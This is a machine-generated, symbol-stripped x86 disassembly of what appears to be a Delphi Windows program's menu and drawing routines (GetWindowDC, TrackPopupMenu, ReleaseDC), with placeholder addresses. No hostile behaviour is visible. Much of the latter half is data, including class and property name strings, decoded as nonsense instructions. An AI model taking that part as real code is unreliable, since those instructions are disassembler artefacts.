test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_455810
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_454f10
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_454f10
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4560c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4560a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_456087
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_422568
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_422408
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45608e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_422568
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43eedc
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46270c
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_454f10
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_454f10
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_454f10
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_454f40
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_454f40
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4623a8
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_462410
jmp r-xdata
sub_4560ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_456164
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_416044
pop esi
pop ebx
retn
push ebx
push sub_455bd4
call sub_41f2e4
mov [ ebx + 0x10 ] eax
sub_4561a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454d28
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_456164
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_45621c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45618c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454dc4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_456274
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_451200
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_455a30
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_455a30
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_4562bc
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_451200
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460fb4
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4038bc
mov edx eax
jmp r-xdata
sub_456308
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_414b3c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_456274
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45467c
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_454b78
mov eax [ ebx + 0x34 ]
call sub_452054
mov eax ebx
call sub_455520
mov eax ebx
call sub_4562bc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_452184
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4563bc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4161a0
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4161a0
cmp ebp [ eax ]
jne r-xdata
sub_4563f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0x80000004
mov eax [ edi + 0x14 ]
call sub_421ce0
mov edx 0x80000007
mov eax [ edi + 0xc ]
call sub_421514
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0x8000000d
mov eax [ edi + 0x14 ]
call sub_421ce0
mov edx 0x8000000e
mov eax [ edi + 0xc ]
call sub_421514
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4038bc
mov edx [ r-xdata ]
call sub_40384c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0x80000004
mov eax [ edi + 0x14 ]
call sub_421ce0
mov edx 0x80000011
mov eax [ edi + 0xc ]
call sub_421514
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4564e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404480
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4046e4
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_40497c
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4046e4
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_40497c
jmp r-xdata
sub_456578
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_40442c
mov ebx 0x1
mov eax esi
call sub_4046e4
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40460c
sub_4565dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456635
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4564e0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4564e0
mov eax [ ebp - 0x8 ]
pop edx
call sub_408838
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45663c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_456644
adc al [ eax ]
add [ eax ] al
clc
imul ecx [ eax ] 0xffffffdc
aam 0x48
add ah dh
imul ecx [ eax ] 0xffffff94
aam 0x48
add al dh
imul ecx [ eax ] 0x38
aam 0x48
add ah ch
imul ecx [ eax ] 0x70
aam 0x48
add al ch
imul ecx [ eax ] 0x48
xlat
dec eax
add ah ah
imul ecx [ eax ] 0x78
aam 0x48
add al ah
imul ecx [ eax ] 0xffffffe4
aad 0x48
add ah bl
imul ecx [ eax ] 0x64
aad 0x48
add al bl
imul ecx [ eax ] 0xffffffdc
xlat
dec eax
add ah dl
imul ecx [ eax ] 0xffffffd8
xlat
dec eax
add al dl
imul ecx [ eax ] 0x1c
aad 0x48
add ah cl
imul ecx [ eax ] 0xffffff90
xlat
dec eax
add al cl
imul ecx [ eax ] 0x4c
xlat
dec eax
add ah al
imul ecx [ eax ] 0x30
fmul [ eax ]
shr [ ebx + 0x48 ] 0x0
cld
xlat
dec eax
add [ ebx + ebp * 2 - 0x2ad3ffb8 ] bh
dec eax
add [ eax + 0x3c00486b ] bh
aad 0x48
add [ ebx + ebp * 2 - 0x2a87ffb8 ] dh
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45673c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456743
retn
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax [ rw-data ]
call sub_4036c0
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404f0c
mov eax rw-data
call sub_40442c
sub_456748
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_456644
call sub_4041d8
mov eax [ r-xdata ]
call sub_4157d0
mov eax [ r-xdata ]
call sub_415870
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov eax [ r-xdata ]
call sub_415714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428d88
mov [ rw-data ] eax
sub_456874
add [ eax ] al
push ebx
arpl [ edx + 0x6f ] si
insb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push r-xdata
add [ eax ] al
cmp [ edx ] 0x41
add [ eax ] cl
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6a ] bl
push 0x3af40045
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
add [ ecx ] 0x0
outsd
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
jae r-xdata
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
push 0x80045
add bh bh
or [ eax ] al
add bh bh
cld
xchg ebx eax
inc ebp
add [ eax ] al
jb r-xdata
shl al 0x68
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ ebx + ebx * 4 + 0x45 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
in al 0x9a
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
inc edx
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
and [ ebp + eax * 2 + 0x100 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
pushfd
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
jl r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
fwait
inc ebp
add eax 0x6f6c6f43
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41f844
sub [ eax ] al
add bh bh
sub [ ebx + 0x10045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x7fffffec ] al
add [ eax ] eax
loopne r-xdata
jae r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
pop ds
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
outsd
insb
outsd
jb r-xdata
jb r-xdata
outsd
insb
outsd
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
push 0xf030045
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
push 0x45
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
pop esp
fwait
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
enter 0x4568 0x0
dec eax
add [ eax ] al
add [ eax + 0x800413a ] al
je r-xdata
pop [ eax + eax + 0x60 ]
pop eax
dec esi
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
pop eax
push 0x41
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + ebp * 2 ] ch
inc ebp
add [ ecx ] cl
jae r-xdata
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
add [ edi + ecx * 4 + 0x58600044 ] bl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jmp [ esp + ebx * 4 + 0x45 ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
lodsb [ esi ]
pushfd
inc ebp
add al al
pushfd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc ebp
add [ ecx ] dl
add al 0x94
push edx
jne r-xdata
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
xor al 0x12
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc ecx
add [ esp + edx * 4 ] al
popad
jb r-xdata
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add al bh
sahf
inc ebp
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax + 0x4 ] 0xffffffa6
inc ebp
add al bl
lahf
inc ebp
add al al
pop ecx
inc esp
add [ edi + ebx * 4 + 0x56a40045 ] bl
inc esp
add [ edi + ebx * 4 + 0x5a580045 ] ch
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add al bh
lahf
inc ebp
add [ eax - 0x23ffba5e ] ch
movsb [ edi ] [ esi ]
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
jmp eax
jae r-xdata
or dh [ ebx + 0x73 ]
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
int3
rcr [ eax + 0x6b ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
insb
inc ebp
add [ esi + 0x6c ] cl
inc ebp
add [ edx + eax ] bl
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x61 ] ah
inc ebp
inc ecx
jb r-xdata
inc esi
insb
popad
je r-xdata
add [ eax ] al
insb
push ebx
arpl [ edx + 0x6f ] si
add eax 0x6d726f46
jae r-xdata
insb
insb
inc edx
popad
jb r-xdata
dec eax
outsd
je r-xdata
sub_4570c5
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_4579cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x7b
inc ebp
add [ eax + 0x457c ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
jpo r-xdata
dec esp
sbb eax [ eax + eax + 0x2c ]
jmp 0xffffffffb7697a77
add [ esi - 0xfffba84 ] dl
add al [ eax ]
add [ ebx + ebp * 2 ] cl
inc ebp
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + ebp * 4 - 0x54c3ffbb ] dl
inc ebp
add [ ecx + edi ] bl
inc eax
add al bl
into
inc ebp
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebx + ebp * 4 - 0x7063ffbb ] ah
inc esp
add [ ecx + esi * 4 ] dl
inc ebp
add [ edx + ebp * 2 - 0x529bffbf ] al
inc ebp
add [ eax - 0x53ffba53 ] ah
scasb [ edi ]
inc ebp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ edi + esi * 4 ] ah
inc ebp
add [ esi ] cl
inc ecx
add [ ecx + esi * 8 + 0x45 ] bh
add [ eax ] cl
test al 0x45
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4 ] eax
mov ah 0x45
add [ edx + eax * 4 + 0xff00044 ] ah
inc esp
add ah dh
cmove eax [ eax ]
clc
mov ah 0x45
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add ah ch
mov dh 0x45
add [ eax - 0x7ffba4b ] bh
sbb eax 0xb7640044
inc ebp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax + 0x4 ] 0xffffffa6
inc ebp
add [ ebp + edi * 4 + 0x45 ] ch
add al al
pop ecx
inc esp
add [ eax ] al
0x45
sub_457ab0
pop esp
int 0x45
add [ esp + ecx * 8 ] bl
inc ebp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ esi + ecx * 8 + 0x58bc0045 ] dl
inc esp
add [ eax - 0x77ffbb7c ] bl
aad 0x45
add [ ecx + eax * 4 + 0x44 ] dl
add [ edx + ebp * 8 + 0x45 ] bl
add al bh
lahf
inc ebp
add [ eax + 0x7c0045a2 ] ch
fild [ ebp ]
mov [ ebp + eax * 2 + 0x45ad0400 ] ch
add [ esi + ebp * 8 ] al
inc ebp
add ah cl
test eax 0xe9400045
inc ebp
add [ eax - 0x30 ] ah
inc ebp
add ah dh
0xb6e80045 0x45
sub_457b04
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
add [ eax ] al
test [ esi + 0x45 ] dh
add [ eax + 0x2 ] dl
add [ eax ] al
mov eax 0x64004576
add al [ eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
sub_457ccc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 ] al
inc ebp
add al dh
add al [ eax ]
add al cl
jns r-xdata
or al 0xe6
inc ecx
add [ ecx + esi * 8 + 0x45 ] bh
add [ eax ] cl
test al 0x45
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4 ] eax
mov ah 0x45
add [ edx + eax * 4 + 0xff00044 ] ah
inc esp
add ah dh
cmove eax [ eax ]
clc
mov ah 0x45
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add ah ch
mov dh 0x45
add [ eax - 0x7ffba4b ] bh
sbb eax 0xb7640044
